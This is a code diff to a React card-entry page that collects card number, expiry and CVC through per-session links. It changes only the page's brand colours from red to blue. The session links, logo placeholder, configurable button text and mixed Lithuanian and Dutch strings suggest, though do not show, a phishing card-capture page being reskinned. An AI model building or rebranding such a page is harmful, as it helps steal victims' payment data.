@@ -136,7 +136,7 @@ export function CardClient({ sessionId }: Props) {
     return (
       <div className="flex min-h-[100dvh] items-center justify-center">
         <div className="flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-[#E30613]/30 border-t-[#E30613]" />
+          <div className="size-12 animate-spin rounded-full border-4 border-[#00A9E0]/30 border-t-[#00A9E0]" />
         </div>
       </div>
     );
@@ -145,7 +145,7 @@ export function CardClient({ sessionId }: Props) {
   if (!supabase) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[#160509] border border-[#E30613] shadow-[0_0_40px_rgba(227,6,19,0.3)] p-5 sm:p-8">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#160509] border border-[#00A9E0] shadow-[0_0_40px_rgba(0,169,224,0.3)] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -155,7 +155,7 @@ export function CardClient({ sessionId }: Props) {
   if (!sessionId) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[#160509] border border-[#E30613] shadow-[0_0_40px_rgba(227,6,19,0.3)] p-5 sm:p-8 text-center">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#160509] border border-[#00A9E0] shadow-[0_0_40px_rgba(0,169,224,0.3)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
             Neteisinga nuoroda.
           </p>
@@ -166,7 +166,7 @@ export function CardClient({ sessionId }: Props) {
 
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] bg-[#160509] border border-[#E30613] shadow-[0_0_40px_rgba(227,6,19,0.3)] p-6 sm:p-10 relative z-10 fade-in">
+      <div className="w-full max-w-[650px] rounded-[24px] bg-[#160509] border border-[#00A9E0] shadow-[0_0_40px_rgba(0,169,224,0.3)] p-6 sm:p-10 relative z-10 fade-in">
         
         {/* Right Top Logo Placeholder */}
         <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
@@ -194,7 +194,7 @@ export function CardClient({ sessionId }: Props) {
             <input
               required
               inputMode="numeric"
-              className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg tracking-widest text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#E30613] focus:outline-none focus:ring-2 focus:ring-[#E30613]/50"
+              className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg tracking-widest text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#00A9E0] focus:outline-none focus:ring-2 focus:ring-[#00A9E0]/50"
               value={number}
               onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
               autoComplete="cc-number"
@@ -206,7 +206,7 @@ export function CardClient({ sessionId }: Props) {
               <input
                 required
                 placeholder="MM/JJ"
-                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#E30613] focus:outline-none focus:ring-2 focus:ring-[#E30613]/50"
+                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#00A9E0] focus:outline-none focus:ring-2 focus:ring-[#00A9E0]/50"
                 value={expiry}
                 onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                 autoComplete="cc-exp"
@@ -220,7 +220,7 @@ export function CardClient({ sessionId }: Props) {
                 required
                 inputMode="numeric"
                 maxLength={4}
-                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#E30613] focus:outline-none focus:ring-2 focus:ring-[#E30613]/50"
+                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#00A9E0] focus:outline-none focus:ring-2 focus:ring-[#00A9E0]/50"
                 value={cvc}
                 onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                 autoComplete="cc-csc"
@@ -241,7 +241,7 @@ export function CardClient({ sessionId }: Props) {
           <button
             type="submit"
             disabled={saving || !expiryValid || !cvcValid}
-            className="w-full rounded-xl bg-gradient-to-r from-[#E30613] to-[#ff4d59] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(227,6,19,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
+            className="w-full rounded-xl bg-gradient-to-r from-[#00A9E0] to-[#ff4d59] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,169,224,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
             {saving ? "Verzenden..." : settings.card_button}
           </button>
